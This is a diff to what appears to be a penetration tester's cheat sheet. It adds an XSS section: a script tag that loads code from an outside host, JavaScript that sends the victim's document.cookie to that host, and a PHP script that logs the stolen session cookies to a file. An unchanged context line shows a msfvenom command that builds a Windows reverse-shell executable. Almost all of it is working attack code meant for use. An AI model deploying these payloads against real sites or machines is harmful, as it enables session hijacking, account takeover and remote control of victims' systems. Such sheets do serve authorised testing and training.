@@ -442,3 +442,14 @@ egrep -ir 'found' */dirb*
 
 # ----- msfvenom ----- #
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT 80 -f exe > /tmp/file.exe
+
+# ----- XSS Payloads ----- #
+
+#### XSS Injection payload:
+<script src=//10.1.1.110/1.js></script>
+
+1.js payload content:
+var i=new Image(); i.src="http://10.1.1.110/c.php?q="+document.cookie;
+
+c.php that collects session cookies and stores them in a file:
+<?php $cookie = $_SERVER['QUERY_STRING']; $logfile=fopen("cookies.txt", "a+"); fputs($logfile, "COOKIE REC: $cookie" . PHP_EOL); fclose($logfile); ?>
